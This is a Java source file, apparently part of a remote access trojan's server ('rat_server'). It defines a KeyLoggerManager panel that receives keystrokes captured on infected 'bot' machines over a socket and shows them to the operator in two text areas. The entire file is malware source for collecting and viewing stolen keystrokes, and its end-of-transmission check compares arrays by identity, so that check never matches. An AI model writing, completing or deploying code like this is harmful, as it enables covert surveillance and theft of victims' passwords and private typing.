package rat_server;

import java.awt.GridLayout;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;

public class KeyLoggerManager extends JPanel
{
    private Socket socket;
    private ObjectInputStream ois;
    private ObjectOutputStream oos;
    private Thread thread;
    private JTextArea hRChars,chars; 
    public KeyLoggerManager(Socket socket)
    {
        super();
        setLayout(new GridLayout(2,1,10,10));
        hRChars=new JTextArea(10,20);
        chars=new JTextArea(10,20);
        hRChars.setEditable(false);
        chars.setEditable(false);
        JScrollPane scrollArea=new JScrollPane(hRChars,JScrollPane.VERTICAL_SCROLLBAR_ALWAYS,
                                               JScrollPane.HORIZONTAL_SCROLLBAR_ALWAYS);
        add(scrollArea);
        JScrollPane _scrollArea=new JScrollPane(chars,JScrollPane.VERTICAL_SCROLLBAR_ALWAYS,
                                               JScrollPane.HORIZONTAL_SCROLLBAR_ALWAYS);
        add(_scrollArea);
        this.socket=socket;
        try
        {
            ois=new ObjectInputStream(socket.getInputStream());
            oos=new ObjectOutputStream(socket.getOutputStream());
        }
        catch(IOException exc)
        {
            
        }
        thread=new Thread(new UpdateBotView());
        thread.start();
    }
    
    Socket getSocket()
    {
        return socket;
    }
    
    ObjectOutputStream getOutputStream()
    {
        return oos;
    }
    
    private class UpdateBotView implements Runnable
    {
        @Override
        public void run()
        {
             
            try
            {
                String[] tmp;
                while(!socket.isClosed()&&!((tmp=(String[])ois.readObject()).equals(new String[]{"END_OF_TRANSIMISSION"})))
                {
                    hRChars.append(tmp[0]);
                    chars.append(tmp[1]);
                }
               
            }
            catch(IOException exc)
            {
                
            }
            catch(ClassNotFoundException exc)
            {
                exc.printStackTrace();
            }
        }
    }
    
    
}
